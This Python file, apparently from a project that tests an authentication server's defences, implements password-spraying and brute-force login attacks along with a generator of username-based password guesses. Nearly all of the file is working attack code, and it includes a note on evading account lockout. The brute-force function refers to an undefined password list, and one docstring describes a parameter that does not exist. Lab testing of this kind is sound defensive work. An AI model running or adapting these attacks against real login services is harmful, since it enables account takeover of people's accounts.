"""
attacks.py
Attack simulation methods for testing authentication server security.
"""

from typing import List
import requests
import json
import time
import attacks_const as const

def load_passwords_from_file(file_path: str = None) -> List[str]:
    """
    Load passwords from JSON file.
    
    :param file_path: Path to passwords JSON file (defaults to const.PASSWORDS_FILE_PATH)
    :return: List of passwords
    """
    if file_path is None:
        file_path = const.PASSWORDS_FILE_PATH

    with open(file_path, 'r', encoding='utf-8') as f:
        passwords = json.load(f)
        
        print(f"[*] Loaded {len(passwords)} passwords from {file_path}")
        return passwords
    
def password_spraying(
    server_url: str,
    usernames: List[str],
    endpoint: str = "/login",
):
    """
    Simulate a password spraying attack.
    
    Tries common passwords against multiple user accounts. This attack avoids
    account lockout by trying one password against many users before moving
    to the next password.
    
    :param server_url: Base URL of the authentication server (e.g., "http://localhost:8000")
    :param usernames: List of usernames to target
    :param passwords: List of passwords to try (defaults to COMMON_PASSWORDS)
    """
    passwords = load_passwords_from_file()
    
    print(f"[*] Starting password spraying attack")
    print(f"[*] Target: {server_url}/{endpoint}")
    print(f"[*] Testing {len(passwords)} passwords against {len(usernames)} users")
    print(f"[*] Total attempts: {len(passwords) * len(usernames)}")
    session = requests.Session()
    # Try each password against all users
    for password in passwords:
        print(f"\n[*] Trying password: '{password}'")
        
        for username in usernames:
            try:
                print(f"\n[*] Trying user: '{username}'")
                response = session.post(
                    f"{server_url}{endpoint}",
                    json={"username": username, "password": password}
                )
                
                if response.status_code == const.SERVER_SUCCESS:
                    data = response.json()
                    if data.get("status") == "success":
                        print(f"[+] SUCCESS! Username: '{username}' Password: '{password}'")
                    
            except requests.exceptions.RequestException as e:
                print(f"[!] Error connecting to server: {e}")
    
    print(f"\n[*] Attack completed")


def brute_force_attack(
    server_url: str,
    target_username: str,
    max_attempts: int = None,
    endpoint: str = "/login"
):
    """
    Simulate a brute force attack against a specific user.
    
    Tries many passwords against a single user account. This is more aggressive
    but more likely to trigger rate limiting mechanisms.
    
    :param server_url: Base URL of the authentication server (e.g., "http://localhost:8000")
    :param target_username: Username to target
    :param password_list: List of passwords to try (defaults to COMMON_PASSWORDS + generated variations)
    :param max_attempts: Maximum number of attempts before stopping (None for unlimited)
    """
    if password_list is None:
        # Use common passwords plus some variations
        password_list = load_passwords_from_file() + _generate_password_variations(target_username)
    
    login_url = f"{server_url}/{endpoint}"
    
    print(f"[*] Starting brute force attack")
    print(f"[*] Target: {server_url}")
    print(f"[*] Target username: '{target_username}'")
    print(f"[*] Password list size: {len(password_list)}")
    session = requests.Session()
    attempts = 0
    for i, password in enumerate(password_list, 1):
        # Check if we've reached max_attempts
        if max_attempts and attempts >= max_attempts:
            print(f"\n[*] Reached maximum attempts limit ({max_attempts})")
            break
        
        attempts += 1
        
        if i % 10 == 0:
            print(f"[*] Progress: {i}/{len(password_list)} attempts...")
        
        try:
            response = session.post(
                login_url,
                json={"username": target_username, "password": password},
                timeout=const.DEFAULT_TIMEOUT
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    print(f"\n[+] SUCCESS! Password found: '{password}'")
                    print(f"[+] Cracked {target_username} after {attempts} attempts")
                    return
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error connecting to server: {e}")
    
    print(f"\n[*] Attack completed")
    print(f"[*] Password NOT found after {attempts} attempts")


def _generate_password_variations(username: str = None) -> List[str]:
    """
    Generate additional password variations for brute force attacks.
    
    :param username: Optional username to generate username-based variations
    :return: List of password variations
    """
    variations = []
    
    # Common number patterns
    for i in range(const.PASSWORD_GEN_NUMBER_START, const.PASSWORD_GEN_NUMBER_END, 
                   const.PASSWORD_GEN_NUMBER_STEP):
        variations.append(str(i))
    
    # Year-based passwords
    for year in range(const.PASSWORD_GEN_YEAR_START, const.PASSWORD_GEN_YEAR_END):
        variations.append(str(year))
    
    # Common words with numbers
    for word in const.PASSWORD_GEN_COMMON_WORDS:
        for num in range(const.PASSWORD_GEN_NUMBER_RANGE):
            variations.append(f"{word}{num}")
            variations.append(f"{word}{num}{num}")
            variations.append(f"{num}{word}")
    
    # Username-based variations
    if username:
        # Add username as-is and common variations
        variations.append(username)
        variations.append(username.capitalize())
        variations.append(username.upper())
        variations.append(username.lower())
        
        # Username with numbers
        for num in range(const.PASSWORD_GEN_NUMBER_RANGE):
            variations.append(f"{username}{num}")
            variations.append(f"{username}{num}{num}")
            variations.append(f"{num}{username}")
        
        # Username with years
        for year in range(const.PASSWORD_GEN_YEAR_START, const.PASSWORD_GEN_YEAR_END):
            variations.append(f"{username}{year}")
            variations.append(f"{year}{username}")
        
        # Common punctuation patterns
        variations.append(f"{username}!")
        variations.append(f"{username}@")
        variations.append(f"{username}123")
    
    return variations
